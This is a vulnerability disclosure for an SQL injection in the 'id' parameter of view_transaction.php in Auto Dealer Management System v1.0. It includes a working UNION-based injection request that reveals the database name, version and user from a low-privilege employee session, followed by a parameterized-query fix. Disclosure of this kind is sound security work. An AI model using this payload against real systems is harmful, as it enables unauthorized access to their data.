# Auto Dealer Management System - SQL Injection on page view_transaction.php and parameter is id, through application url is (?page=vehicles/view_transaction&id=?) with low privilege authentication

### Date: 
> 18 February 2023
### Author Name: 
> Muhammad Navaid Zafar Ansari
### Author Email: 
> navaidnasari@hotmail.co.uk
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Auto Dealer Management System](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### SQL Injection
> SQL Injection is a type of vulnerability in web applications that allows an attacker to execute unauthorized SQL queries on the database by exploiting the application's failure to properly validate user input. The attacker can use this vulnerability to bypass the security measures put in place by the application, allowing them to access or modify sensitive data, or even take control of the entire system. SQL Injection attacks can have severe consequences, including data loss, financial loss, reputational damage, and legal liability. To prevent SQL Injection attacks, developers should properly sanitize and validate all user input, and implement strong security measures, such as input validation, output encoding, parameterized queries, and access controls. Users should also be aware of the risks of SQL Injection attacks and take appropriate measures to protect their data.
### Affected Page:
> view_transaction.php

> On this page id parameter is vulnerable to SQL Injection Attack

> URL of the vulnerable parameter is: ?page=vehicles/view_transaction&id=*
### Description:
> The auto dealer management system supports two roles of users, one is admin, and another is a normal employee. the detail of role is given below
+ Admin user has full access to the system 
+ Employee user has only a few menu access i.e. dashboard, car models and vehicle (available and transaction)
> Employee could perform the SQL Injection by viewing the vehicle transaction from his/her profile. Therefore, low-privileged users could able to get the access full system.
### Proof of Concept:
> Following steps are involved:
+ An employee view the vehicle transaction and could perform the SQL injection with vulnerable parameter (?page=vehicles/view_transaction&id=5*)
### Request:
```
GET /adms/admin/?page=vehicles/view_transaction&id=5%27+and+false+union+select+1,2,3,4,5,6,7,8,9,database(),version(),12,13,user()--+- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c1ig2qf0q44toal7cqbqvikli5
Connection: close
```

### Response:
![image](https://user-images.githubusercontent.com/123810418/219882001-6031474c-b28b-4401-b282-6ff470086be3.png)

### Recommendation:
> Whoever uses this CMS, should update the code of the application in to parameterized queries to avoid SQL Injection attack:
```
Example Code: 
$sql = $obj_admin->db->prepare("SELECT *, concat(firstname,' ',COALESCE(concat(middlename,' '), ''), lastname) as customer from `transaction_list` where id = :id ");
$sql->bindparam(':id', $id);
$sql->execute();
$row = $sql->fetch(PDO::FETCH_ASSOC);
```
Thank you for reading